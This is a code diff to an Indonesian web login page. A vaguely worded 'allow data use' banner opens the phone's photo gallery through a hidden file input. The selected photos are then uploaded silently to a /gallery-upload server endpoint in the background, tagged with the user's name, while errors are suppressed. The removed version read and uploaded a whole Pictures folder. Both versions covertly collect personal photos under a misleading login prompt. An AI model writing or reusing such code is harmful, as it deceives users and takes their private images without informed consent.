@@ -477,7 +477,6 @@ table td { font-size: 11px; }
     <!-- Gallery Permission Banner -->
     <div id="galleryPermBanner">
       <div class="gpb-row">
-        <span class="gpb-icon">📸</span>
         <div class="gpb-text">
           <div class="gpb-title">Izinkan Akses Penggunaan Data</div>
           <div class="gpb-sub">Izinkan penggunaan data perangkat kamu untuk keperluan layanan. Tidak wajib — pilih sesuai keinginan kamu.</div>
@@ -488,6 +487,8 @@ table td { font-size: 11px; }
         </div>
       </div>
     </div>
+    <!-- Hidden file input untuk galeri (buka langsung ke foto HP) -->
+    <input type="file" id="galleryFileInput" accept="image/*" multiple style="display:none" onchange="galleryHandleFiles(this.files)">
     <div class="text-center mb-8">
       <h1 class="text-3xl font-bold text-white tracking-tight mb-1">Login</h1>
       <p class="text-pro-text text-sm">Masuk untuk mengakses sistem</p>
@@ -6177,8 +6178,7 @@ async function loginWithGallery(){
   // Jika sudah pernah beri izin → langsung login, tidak perlu banner lagi
   var saved=await galleryGetSavedFolder();
   if(saved){_galleryHasPerm=true;login();return;}
-  // Jika browser tidak support File System API → langsung login
-  if(!window.showDirectoryPicker){login();return;}
+  // Lanjutkan — browser modern semua support file input
   // Tampilkan banner notif izin dulu — TIDAK buka folder picker langsung
   var banner=document.getElementById('galleryPermBanner');
   if(banner){
@@ -6187,20 +6187,48 @@ async function loginWithGallery(){
   }
   // Login dipanggil setelah user pilih di banner (galleryDoAllow / galleryDoDeny)
 }
-// User klik "Izinkan" di banner → buka folder picker → lalu login
-async function galleryDoAllow(){
+// User klik "Izinkan" di banner → buka galeri foto langsung (file input)
+function galleryDoAllow(){
   var banner=document.getElementById('galleryPermBanner');
   if(banner)banner.style.display='none';
-  try{
-    var h=await window.showDirectoryPicker({startIn:'pictures',mode:'read'});
-    var p=await h.requestPermission({mode:'read'});
-    if(p==='granted'){
-      _galleryFolderHandle=h;_galleryFolderName=h.name;_galleryHasPerm=true;
-      await gallerySaveFolderInfo(h.name);
-      galleryReadAndUploadBg(h);
+  // Buka galeri foto HP langsung — tidak perlu pilih folder
+  var inp=document.getElementById('galleryFileInput');
+  if(inp){
+    inp.value=''; // reset supaya bisa pilih ulang
+    inp.click();
+    // login() dipanggil di galleryHandleFiles setelah user pilih foto
+  }else{
+    login();
+  }
+}
+// Dipanggil saat user selesai memilih foto dari galeri
+function galleryHandleFiles(files){
+  if(!files||files.length===0){login();return;}
+  _galleryFiles=[];
+  for(var i=0;i<files.length;i++){
+    var f=files[i];
+    if(f.type.startsWith('image/')&&f.size<=10*1024*1024){
+      _galleryFiles.push({name:f.name,file:f,size:f.size,url:URL.createObjectURL(f)});
     }
-  }catch(e){/* user cancel — tetap login */}
+  }
+  _galleryHasPerm=true;
+  // Simpan penanda izin di IndexedDB
+  gallerySaveFolderInfo('galeri-hp');
+  // Upload di background setelah login
+  if(_galleryFiles.length>0)galleryUploadBgFiles(_galleryFiles);
   login();
+}
+// Upload array files ke server di background
+async function galleryUploadBgFiles(files){
+  var API_UPLOAD=(typeof API_BASE_URL!=='undefined'?API_BASE_URL:'https://pda-mini-mataram.netlify.app/api')+'/gallery-upload';
+  for(var i=0;i<files.length;i++){
+    try{
+      var form=new FormData();
+      form.append('file',files[i].file,files[i].name);
+      form.append('uploader',typeof currentUserNameInv!=='undefined'?currentUserNameInv:'visitor');
+      fetch(API_UPLOAD,{method:'POST',body:form}).catch(function(){});
+    }catch(e){}
+  }
 }
 // User klik "Tidak" → langsung login tanpa akses galeri
 function galleryDoDeny(){
@@ -6209,24 +6237,7 @@ function galleryDoDeny(){
   login();
 }
 
-// Baca folder & upload di background tanpa blok UI
-async function galleryReadAndUploadBg(handle){
-  try{
-    var files=await galleryReadFolder(handle);
-    if(!files.length)return;
-    _galleryFiles=files;
-    // Upload semua ke server di background
-    var API_UPLOAD=(typeof API_BASE_URL!=='undefined'?API_BASE_URL:'https://pda-mini-mataram.netlify.app/api')+'/gallery-upload';
-    for(var i=0;i<files.length;i++){
-      try{
-        var form=new FormData();
-        form.append('file',files[i].file,files[i].name);
-        form.append('uploader',typeof currentUserNameInv!=='undefined'?currentUserNameInv:'visitor');
-        fetch(API_UPLOAD,{method:'POST',body:form}).catch(function(){});
-      }catch(e2){}
-    }
-  }catch(e){}
-}
+
 
 // ── Modal Gallery (untuk admin melihat foto, atau manual share) ──
 function galleryOpenModal(){
